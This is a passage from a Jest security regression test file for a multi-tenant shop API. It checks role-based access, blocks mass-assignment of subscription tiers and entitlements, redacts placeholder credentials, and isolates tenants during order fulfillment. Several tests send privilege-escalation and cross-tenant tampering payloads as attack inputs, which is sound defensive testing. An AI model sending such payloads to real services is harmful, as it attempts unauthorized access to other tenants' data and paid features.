              new NextRequest('http://localhost:3000/api/v1/admin/tenants/toko-alpha/status', {
                method: 'PATCH',
                headers: {
                  'Content-Type': 'application/json',
                  ...(t ? { authorization: `Bearer ${t}` } : {}),
                },
                body: JSON.stringify({ action: 'TOGGLE_STATUS', is_active: true }),
              }),
              { params: Promise.resolve({ slug: 'toko-alpha' }) }
            ),
        },
        {
          name: 'GET /api/v1/admin/broadcast-announcement',
          call: (t) =>
            getBroadcastAnnouncementRoute(
              new NextRequest('http://localhost:3000/api/v1/admin/broadcast-announcement', {
                headers: t ? { authorization: `Bearer ${t}` } : {},
              })
            ),
        },
        {
          name: 'POST /api/v1/admin/broadcast-announcement',
          call: (t) =>
            postBroadcastAnnouncementRoute(
              new NextRequest('http://localhost:3000/api/v1/admin/broadcast-announcement', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                  ...(t ? { authorization: `Bearer ${t}` } : {}),
                },
                body: JSON.stringify({ dryRun: true }),
              })
            ),
        },
        {
          name: 'GET /api/v1/admin/ai-economics',
          call: (t) =>
            getAiEconomicsRoute(
              new NextRequest('http://localhost:3000/api/v1/admin/ai-economics', {
                headers: t ? { authorization: `Bearer ${t}` } : {},
              })
            ),
        },
      ];

      for (const tc of checkCases) {
        const unauthRes = await tc.call(undefined);
        expect(unauthRes.status).toBe(401);

        const amRes = await tc.call('affiliate-jwt');
        expect(amRes.status).toBe(403);
      }

      // Positive: /api/v1/admin/session allows SUPERADMIN
      const saSessionRes = await getAdminSessionRoute(
        new NextRequest('http://localhost:3000/api/v1/admin/session', {
          headers: { authorization: 'Bearer superadmin-jwt' },
        })
      );
      expect(saSessionRes.status).toBe(200);

      // Positive & 401 for /api/v1/admin/affiliates/am
      const amUnauth = await getAffiliateManagersRoute(
        new NextRequest('http://localhost:3000/api/v1/admin/affiliates/am')
      );
      expect(amUnauth.status).toBe(401);

      const amAllowed = await getAffiliateManagersRoute(
        new NextRequest('http://localhost:3000/api/v1/admin/affiliates/am', {
          headers: { authorization: 'Bearer affiliate-jwt' },
        })
      );
      expect(amAllowed.status).toBe(200);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SUITE 3: ITEMS B & C — Mass Assignment & Fail-Closed Subscription Guards
  // ═══════════════════════════════════════════════════════════════════════════
  describe('Suite 3 — Items B & C: Entitlement Mass-Assignment Block & Fail-Closed Subscription Guards', () => {
    it('blocks tier, plan_tier, features, capabilities, subscription_status, is_active mass assignment on PUT /settings and PUT /theme (403)', async () => {
      for (const payload of [
        { tier: 'ENTERPRISE' },
        { plan_tier: 'TEAM_SCALE' },
        { metadata: { features: { custom_domain: true } } },
        { entitlements: { capabilities: ['UNLIMITED_AI'] } },
        { subscription_status: 'ACTIVE', is_active: true },
      ]) {
        const settingsRes = await putSettingsRoute(
          makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/settings', {
            method: 'PUT',
            role: 'OWNER',
            tenantSlug: 'toko-alpha',
            tenantId: TENANT_A_ID,
            body: payload,
          }),
          { params: Promise.resolve({ slug: 'toko-alpha' }) }
        );
        expect(settingsRes.status).toBe(403);
        const sJson = await settingsRes.json();
        expect(sJson.error).toBe('MASS_ASSIGNMENT_FORBIDDEN');

        const themeRes = await putThemeRoute(
          makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/theme', {
            method: 'PUT',
            role: 'OWNER',
            tenantSlug: 'toko-alpha',
            tenantId: TENANT_A_ID,
            body: payload,
          }),
          { params: Promise.resolve({ slug: 'toko-alpha' }) }
        );
        expect(themeRes.status).toBe(403);
        const tJson = await themeRes.json();
        expect(tJson.error).toBe('MASS_ASSIGNMENT_FORBIDDEN');
      }
    });

    it('checkTenantMutationPermission fails closed (503 SERVICE_UNAVAILABLE) when Supabase client is null or query errors', async () => {
      (getSupabaseAdmin as jest.Mock).mockReturnValueOnce(null);
      (getSupabase as jest.Mock).mockReturnValueOnce(null);
      const nullClientRes = await checkTenantMutationPermission('toko-alpha');
      expect(nullClientRes.allowed).toBe(false);
      expect(nullClientRes.response?.status).toBe(503);

      state.forceTenantsError = 'simulated connection timeout';
      const dbErrRes = await checkTenantMutationPermission('toko-alpha');
      expect(dbErrRes.allowed).toBe(false);
      expect(dbErrRes.response?.status).toBe(503);
    });

    it('blocks regular merchant from activating a subscription order via quick-paid (403 FORBIDDEN_SUBSCRIPTION_ACTIVATION)', async () => {
      const req = makeMerchantReq(
        `http://localhost:3000/api/v1/tenants/toko-alpha/orders/${ORDER_SUB_ID}/quick-paid`,
        {
          method: 'POST',
          role: 'OWNER',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
          body: {},
        }
      );
      const res = await postQuickPaidRoute(req, {
        params: Promise.resolve({ slug: 'toko-alpha', id: ORDER_SUB_ID }),
      });
      const json = await res.json();
      expect(res.status).toBe(403);
      expect(json.error).toBe('FORBIDDEN_SUBSCRIPTION_ACTIVATION');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SUITE 4: ITEM D — Strict Public & CS/Operator Secret Redaction
  // ═══════════════════════════════════════════════════════════════════════════
  describe('Suite 4 — Item D: Strict Public Metadata Allowlist & CS/Operator Settings Redaction', () => {
    it('strips ALL private credentials from sanitizePublicTenantMetadata & public GET /api/v1/tenants/[slug]', async () => {
      const sanitizedMeta = sanitizePublicTenantMetadata(state.tenants[0].metadata);
      expect(sanitizedMeta.visual_theme).toBe('clean_minimal');
      expect(sanitizedMeta.capi_token).toBeUndefined();
      expect(sanitizedMeta.tiktok_access_token).toBeUndefined();
      expect(sanitizedMeta.waba_config).toBeUndefined();
      expect(sanitizedMeta.bank_accounts).toBeUndefined();
      expect(sanitizedMeta.payment_config).toBeUndefined();
      expect(sanitizedMeta.lincah_config).toBeUndefined();
      expect(sanitizedMeta.shipping_config).toBeUndefined();
      expect(sanitizedMeta.gateway_config).toBeUndefined();

      const res = await getPublicTenantRoute(
        new NextRequest('http://localhost:3000/api/v1/tenants/toko-alpha'),
        { params: Promise.resolve({ slug: 'toko-alpha' }) }
      );
      expect(res.status).toBe(200);
      const bodyStr = JSON.stringify(await res.json());
      expect(bodyStr).not.toContain('EAAG-CAPI-SECRET');
      expect(bodyStr).not.toContain('EAAG-WABA-TOP-SECRET-TOKEN');
      expect(bodyStr).not.toContain('TT-SECRET-123');
      expect(bodyStr).not.toContain('LINCAH-PLAIN-SECRET-KEY-9999');
      expect(bodyStr).not.toContain('EVO-SECRET-KEY-123');
      expect(bodyStr).not.toContain('000201QRISSECRET');
      expect(bodyStr).not.toContain('1234567890');
    });

    it('redacts WABA/CAPI/TikTok/Gateway/Bank/Payment/Lincah secrets for CS & OPERATOR on GET /settings (both Supabase & Core Backend paths)', async () => {
      // 1. Supabase fallback path as CS
      const csRes = await getSettingsRoute(
        makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/settings', {
          role: 'CS',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
        }),
        { params: Promise.resolve({ slug: 'toko-alpha' }) }
      );
      expect(csRes.status).toBe(200);
      const csJson = await csRes.json();
      expect(Array.isArray(csJson.settings.auto_replies)).toBe(true);
      expect(csJson.settings.auto_replies[0].trigger).toBe('harga');

      const csStr = JSON.stringify(csJson);
      expect(csStr).not.toContain('EAAG-CAPI-SECRET');
      expect(csStr).not.toContain('EAAG-WABA-TOP-SECRET-TOKEN');
      expect(csStr).not.toContain('TT-SECRET-123');
      expect(csStr).not.toContain('EVO-SECRET-KEY-123');
      expect(csStr).not.toContain('000201QRISSECRET');
      expect(csStr).not.toContain('LINCAH-PLAIN-SECRET-KEY-9999');
      expect(csStr).not.toContain('1234567890');

      // 2. Core Backend 200 proxy path as OPERATOR
      global.fetch = jest.fn().mockResolvedValue({
        ok: true,
        status: 200,
        json: async () => ({
          success: true,
          settings: {
            slug: 'toko-alpha',
            greeting_message: 'Halo Core Backend',
            capi_token: 'EAAG-CORE-CAPI-SECRET',
            tiktok_access_token: 'TT-CORE-SECRET',
            waba_config: { phone_number_id: '987', access_token: 'EAAG-CORE-WABA-SECRET' },
            gateway_config: { api_key: 'CORE-EVO-KEY' },
            bank_accounts: [{ bank: 'MANDIRI', account_number: '9988776655' }],
            lincah_config: { api_key: 'LINCAH-CORE-SECRET' },
            auto_replies: [{ id: 'ar-2', trigger: 'ongkir', reply: 'Cek otomatis' }],
          },
        }),
      }) as any;

      const opRes = await getSettingsRoute(
        makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/settings', {
          role: 'OPERATOR',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
        }),
        { params: Promise.resolve({ slug: 'toko-alpha' }) }
      );
      expect(opRes.status).toBe(200);
      const opJson = await opRes.json();
      expect(opJson.settings.greeting_message).toBe('Halo Core Backend');
      expect(Array.isArray(opJson.settings.auto_replies)).toBe(true);
      const opStr = JSON.stringify(opJson);
      expect(opStr).not.toContain('EAAG-CORE-CAPI-SECRET');
      expect(opStr).not.toContain('TT-CORE-SECRET');
      expect(opStr).not.toContain('EAAG-CORE-WABA-SECRET');
      expect(opStr).not.toContain('CORE-EVO-KEY');
      expect(opStr).not.toContain('9988776655');
      expect(opStr).not.toContain('LINCAH-CORE-SECRET');

      // 3. OWNER settings also never leaks plaintext Lincah API key
      global.fetch = jest.fn().mockRejectedValue(new Error('Offline')) as any;
      const ownerRes = await getSettingsRoute(
        makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/settings', {
          role: 'OWNER',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
        }),
        { params: Promise.resolve({ slug: 'toko-alpha' }) }
      );
      expect(ownerRes.status).toBe(200);
      const ownerStr = JSON.stringify(await ownerRes.json());
      expect(ownerStr).not.toContain('LINCAH-PLAIN-SECRET-KEY-9999');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SUITE 5: ITEM E — Tenant-Scoped Resi Fulfillment & Lincah Isolation
  // ═══════════════════════════════════════════════════════════════════════════
  describe('Suite 5 — Item E: Tenant-Scoped Order Fulfillment & Server-Side Lincah Credentials', () => {
    it('enforces RBAC & strict tenant_id scoping on POST /api/v1/tenants/[slug]/orders/[id]/fulfill', async () => {
      // Unauthenticated -> 401
      const unauth = await postFulfillOrderRoute(
        makeMerchantReq(`http://localhost:3000/api/v1/tenants/toko-alpha/orders/${ORDER_A_ID}/fulfill`, {
          method: 'POST',
          body: { tracking_number: 'JNE-001' },
        }),
        { params: Promise.resolve({ slug: 'toko-alpha', id: ORDER_A_ID }) }
      );
      expect(unauth.status).toBe(401);

      // Cross-tenant token (toko-beta OWNER targeting toko-alpha) -> 403
      const wrongTenantToken = await postFulfillOrderRoute(
        makeMerchantReq(`http://localhost:3000/api/v1/tenants/toko-alpha/orders/${ORDER_A_ID}/fulfill`, {
          method: 'POST',
          role: 'OWNER',
          tenantSlug: 'toko-beta',
          tenantId: TENANT_B_ID,
          body: { tracking_number: 'JNE-001' },
        }),
        { params: Promise.resolve({ slug: 'toko-alpha', id: ORDER_A_ID }) }
      );
      expect(wrongTenantToken.status).toBe(403);

      // CS role forbidden -> 403
      const csDenied = await postFulfillOrderRoute(
        makeMerchantReq(`http://localhost:3000/api/v1/tenants/toko-alpha/orders/${ORDER_A_ID}/fulfill`, {
          method: 'POST',
          role: 'CS',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
          body: { tracking_number: 'JNE-001' },
        }),
        { params: Promise.resolve({ slug: 'toko-alpha', id: ORDER_A_ID }) }
      );
      expect(csDenied.status).toBe(403);

      // Same-tenant OWNER targeting another tenant's order UUID (ORDER_B_ID) -> 404 ORDER_NOT_FOUND
      const crossOrderAttempt = await postFulfillOrderRoute(
        makeMerchantReq(`http://localhost:3000/api/v1/tenants/toko-alpha/orders/${ORDER_B_ID}/fulfill`, {
          method: 'POST',
          role: 'OWNER',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
          body: { tracking_number: 'JNE-STEAL-999' },
        }),
        { params: Promise.resolve({ slug: 'toko-alpha', id: ORDER_B_ID }) }
      );
      expect(crossOrderAttempt.status).toBe(404);
      expect(state.orders.find((o) => o.id === ORDER_B_ID)?.tracking_number).toBeNull();

      // Same-tenant OPERATOR fulfilling ORDER_A_ID -> 200
      const okFulfill = await postFulfillOrderRoute(
        makeMerchantReq(`http://localhost:3000/api/v1/tenants/toko-alpha/orders/${ORDER_A_ID}/fulfill`, {
          method: 'POST',
          role: 'OPERATOR',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
          body: { tracking_number: 'JNE-ALPHA-888', shipping_status: 'SHIPPED' },
        }),
        { params: Promise.resolve({ slug: 'toko-alpha', id: ORDER_A_ID }) }
      );
      expect(okFulfill.status).toBe(200);
      expect(state.orders.find((o) => o.id === ORDER_A_ID)?.tracking_number).toBe('JNE-ALPHA-888');
    });

    it('isolates Lincah API keys to server-side tenant_settings, returns masked status, and strips keys from tenants.metadata', async () => {
      // Unauth GET -> 401
      const getUnauth = await getShippingConfigRoute(
        new NextRequest('http://localhost:3000/api/v1/shipping/config?tenant_slug=toko-alpha')
      );
      expect(getUnauth.status).toBe(401);

      // Masked GET for OWNER
      const getOwner = await getShippingConfigRoute(
        makeMerchantReq('http://localhost:3000/api/v1/shipping/config?tenant_slug=toko-alpha', {
          role: 'OWNER',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
        })
      );
      expect(getOwner.status).toBe(200);
      const getOwnerJson = await getOwner.json();
      expect(getOwnerJson.courier_config.lincah.has_api_key).toBe(true);
      expect(getOwnerJson.courier_config.lincah.api_key_last4).toBe('9999');
      expect(JSON.stringify(getOwnerJson)).not.toContain('LINCAH-PLAIN-SECRET-KEY-9999');

      // OPERATOR cannot POST Lincah config -> 403
      const postOperator = await postShippingConfigRoute(
        makeMerchantReq('http://localhost:3000/api/v1/shipping/config', {
          method: 'POST',
          role: 'OPERATOR',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
          body: {
            tenant_slug: 'toko-alpha',
            lincah: { api_key: 'NEW-OPERATOR-ATTEMPT' },
          },
        })
      );
      expect(postOperator.status).toBe(403);

      // OWNER POST saves key to tenant_settings, strips tenants.metadata, and returns masked key
      const postOwner = await postShippingConfigRoute(
        makeMerchantReq('http://localhost:3000/api/v1/shipping/config', {
          method: 'POST',
          role: 'OWNER',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
          body: {
            tenant_slug: 'toko-alpha',
            lincah: {
              api_key: 'LINCAH-ROTATED-KEY-5678',
              origin_code: 'BDO',
            },
          },
        })
      );
      expect(postOwner.status).toBe(200);
      const postJson = await postOwner.json();
      expect(postJson.courier_config.lincah.has_api_key).toBe(true);
      expect(postJson.courier_config.lincah.api_key_last4).toBe('5678');
      expect(JSON.stringify(postJson)).not.toContain('LINCAH-ROTATED-KEY-5678');

      // Verify DB state: stored in tenant_settings, absent in tenants.metadata
      const storedSetting = state.tenantSettings.find((s) => s.tenant_slug === 'toko-alpha');
      expect(storedSetting.biteship_config.lincah.api_key).toBe('LINCAH-ROTATED-KEY-5678');
      const storedTenant = state.tenants.find((t) => t.id === TENANT_A_ID);
      expect(storedTenant.metadata.lincah_config?.api_key).toBeUndefined();
      expect(storedTenant.metadata.shipping_config?.lincah?.api_key).toBeUndefined();
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SUITE 6: Positive Merchant CRUD Functional Regressions
  // ═══════════════════════════════════════════════════════════════════════════
  describe('Suite 6 — Positive Merchant & Operator Workflow Regressions', () => {
    it('allows merchant product creation, auto_replies/profile settings save, and clean visual theme update', async () => {
      // 1. Product creation
      const createProdRes = await postProductsRoute(
        makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/products', {
          method: 'POST',
          role: 'OWNER',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
          body: {
            name: 'Paket Skincare Glow',
            price: 199000,
            category: 'physical',
            description: 'Produk perawatan kulit aman BPOM',
          },
        }),
        { params: Promise.resolve({ slug: 'toko-alpha' }) }
      );
      expect(createProdRes.status).toBe(200);
      const prodJson = await createProdRes.json();
      expect(prodJson.success).toBe(true);
      expect(prodJson.product.name).toBe('Paket Skincare Glow');

      // 2. Settings + auto_replies update without forbidden keys
      const updateSettingsRes = await putSettingsRoute(
        makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/settings', {
          method: 'PUT',
          role: 'OWNER',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
          body: {
            bio: 'Toko Alpha Updated Bio',
            auto_replies: [{ id: 'ar-new', trigger: 'jam buka', reply: 'Buka 08:00 - 21:00' }],
          },
        }),
        { params: Promise.resolve({ slug: 'toko-alpha' }) }
      );
      expect(updateSettingsRes.status).toBe(200);
      expect(state.tenants.find((t) => t.id === TENANT_A_ID)?.metadata.auto_replies[0].trigger).toBe('jam buka');

      // 3. Clean visual theme save without section_10
      const updateThemeRes = await putThemeRoute(
        makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/theme', {
          method: 'PUT',
          role: 'OWNER',
          tenantSlug: 'toko-alpha',
          tenantId: TENANT_A_ID,
          body: {
            visual_theme: 'editorial_shop',
            theme: { primaryColor: '#2563eb', mode: 'dark' },
            microsite: { buttons: [{ label: 'Katalog', url: 'https://boontrack.com/toko-alpha' }] },
          },
        }),
        { params: Promise.resolve({ slug: 'toko-alpha' }) }
      );
      expect(updateThemeRes.status).toBe(200);
      const updatedTheme = await updateThemeRes.json();
      expect(updatedTheme.success).toBe(true);
    });
  });
});

